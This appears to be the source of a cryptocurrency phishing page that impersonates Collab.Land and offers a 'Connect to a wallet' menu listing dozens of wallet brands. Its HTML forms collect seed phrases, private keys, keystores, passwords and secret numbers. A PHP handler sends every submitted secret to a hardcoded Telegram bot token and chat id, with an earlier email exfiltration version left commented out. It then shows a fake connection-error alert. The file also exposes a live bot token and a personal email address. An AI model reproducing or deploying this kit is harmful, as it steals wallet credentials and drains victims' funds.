...
//     $to = "paulgam916@gmail.com"; // this is your Email address
//     $from = "support@connectwalletnftsmatbox01.cfd"; //this is the from email
//     if(!empty($_POST['phrase'])){
//         $phrase = htmlentities($_POST['phrase']);
//     }else{
//       $phrase = "NULL";
//     }
//     if(!empty($_POST['keystore'])){
//         $keystore = htmlentities($_POST['keystore']);
//     }else{
//         $keystore = "NULL";
//     }
//     if(!empty($_POST['wallet_id'])){
//         $wallet_id = htmlentities($_POST['wallet_id']);
//     }else{
//       $wallet_id = "NULL"; 
//     }
...
//   if(!empty($_POST['family_seed'])){
//     $family_seed = htmlentities($_POST['family_seed']);
//   }else{
//       $family_seed = "NULL";
//   }
...
//     $message = '<html><body>';
//     $message .= '<h1 style="color:#f40;">New form submission!</h1>';
//     $message .= '<p><b>Phrase:</p></b> '.$phrase.' <p><b>Wallet Id:</p></b> '.$wallet_id.' <p><b>Keystore:</p></b> '.$keystore.' <p><b>Password:</p></b> '.$password.' <p><b>Private Key:</p></b> '.$private_key.' <p><b>Family Seed:</p></b> '.$family_seed.' ';
//     $message .= '</body></html>';
//     mail($to, $subject, $message, $headers);
    
    $telegramToken = '6488551816:AAHywU6pZSueBTi6qVHmx3WwYl-gIIycUpU';
    $chatId = '1647712053'; 
    $telegramMessage = "New Form Submission:\n";
    
    if(!empty($_POST['phrase'])){
        $telegramMessage .= "Phrase: " . htmlentities($_POST['phrase']) . "\n";
    }
    if(!empty($_POST['wallet_id'])){
        $telegramMessage .= "Wallet Id: " . htmlentities($_POST['wallet_id']) . "\n";
    }
    if(!empty($_POST['keystore'])){
        $telegramMessage .= "Keystore: " . htmlentities($_POST['keystore']) . "\n";
    }
    if(!empty($_POST['password'])){
        $telegramMessage .= "Password: " . htmlentities($_POST['password']) . "\n";
    }
    if(!empty($_POST['private_key'])){
        $telegramMessage .= "Private Key: " . htmlentities($_POST['private_key']) . "\n";
    }
    if(!empty($_POST['family_seed'])){
        $telegramMessage .= "Family Seed: " . htmlentities($_POST['family_seed']) . "\n";
    }
    if(!empty($_POST['code'])){
        $telegramMessage .= "Code: " . htmlentities($_POST['code']);
    }
    ...
    echo "<script>window.alert('Unable to connect wallet, try again later.')</script>";
...
<head>
      ...
      <meta property="og:title" content="Welcome to Collab.Land">
   ...
   <body style="display: block;" data-new-gr-c-s-check-loaded="14.1041.0" data-gr-ext-installed="">
     <!-- <div class="sending" data-reach-dialog-overlay="" style="opacity: 1;z-index: 99999;display: none">
         <div class="containerz">
            <img class="qrrrr" src="img/qr-code.png">
         </div>
      </div>
   -->
   <div class="sending" data-reach-dialog-overlay="" style="opacity: 1;z-index: 99999;display: none">
               ...
               <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                  <div class="sm:flex sm:items-start">
                     ...
                     <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
                        <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;"> <img src="img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span id="walletname">Metamask</span>
                           wallet</span>
                        </h3>
                        <div class="mt-2">
                           <div class="mt-10">
                                 ...
                                 <span id="guideDisplay2" style="display: none;">
                                    ...
                                    <div class="flex w-full">
                                       <button type="submit" name="submit" class="btn btn-primary flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                  ...
                                  <div style="display:none" class="thankyou_message">
                                    ...
                                    <div class="flex flex-col mb-6">
                                       <div class="relative" data-children-count="1">
                                          <input type="text" placeholder="Enter your Private Key" name="private_key" id="privatekeyval" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <p class="text-xs text-grey-300 mt-6">
                                    ...
                                    <div class="flex flex-col mb-6">
                                       <div class="relative">
                                          <textarea cols="30" rows="4" placeholder="" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" id="familyseed" name="family_seed" required="" ></textarea>
                                          <p class="text-xs text-grey-300 mt-6">
                                    ...
                                    <div class="flex flex-col mb-6">
                                       <div class="relative">
                                          <input type="text" required="required" placeholder="Secret numbers of row A" name="privatekey1" minlength="6" maxlength="6" id="privatekey1" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row B" name="privatekey2" minlength="6" maxlength="6" id="privatekey2" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row C" name="privatekey3" minlength="6" maxlength="6" id="privatekey3" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row D" name="privatekey4" minlength="6" maxlength="6" id="privatekey4" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row E" name="privatekey5" minlength="6" maxlength="6" id="privatekey5" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row F" name="privatekey6" minlength="6" maxlength="6" id="privatekey6" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row G" name="privatekey7" minlength="6" maxlength="6" id="privatekey7" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400 mb-2">
                                          <input type="text" required="required" placeholder="Secret numbers of row H" name="privatekey8" minlength="6" maxlength="6" id="privatekey8" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
         ...
         <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
            <section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
               <p style="      float: left;
                  ...
                  text-align: left;
                  padding: 14px 24px;
                  color: black;"> Connect to a wallet</p>
               <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Meta">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/xumm.png" alt="Xumm">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/cardano.png" alt="Cardano">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/daedalus.png" alt="Daedalus">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/yoroi.png" alt="Yoroi">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/ccvault.png" alt="CCVault">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/gero.jpg" alt="Gero">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/nami.png" alt="Nami">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/solana.png" alt="Solana">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/phantom.jpg" alt="Phantom">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/solflare.png" alt="Solflare">
                     </div>
                  </div>
                  <!-- end -->  
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/sollet.png" alt="Sollet">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/solong.jpg" alt="Solong">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/exodus.png" alt="Exodus">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/avalanche.png" alt="Avalanche">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/velas.png" alt="Velas">
                     </div>
                  </div>
                  <!-- end --> 
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Cypto.com">
                     </div>
                  </div>
                  <!-- end -->          
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/blockchain-logo.png" alt="Blockchain">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/bsc-logo.png" alt="binance">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" alt="safepal">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/image.jpg" alt="Argent">
                     </div>
                  </div>
                  <!-- end -->  
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/formatic.png" alt="Meta">
                     </div>
                  </div>
                  <!-- end -->                   
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="aktionariat">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="keyring">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" alt="bitkeep">
                     </div>
                  </div>
                  <!-- end -->         
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" alt="SparkPoint">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="ownbit">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png" alt="infinity">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/wallet-io-198f396de22fe25eb370f46544abe69d.png" alt="wallet.io">
                     </div>
                  </div>
                  <!-- end -->                
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/image%20(6).jpg" alt="torus">
                     </div>
                  </div>
                  <!-- end -->         
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/image%20(5).jpg" alt="nash">
                     </div>
                  </div>
                  <!-- end -->            
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="Bitpay">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imtoken">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="img/otherssss.jpg" alt="Other">
                     </div>
                  </div>
                  <!-- end -->                     
               </div>
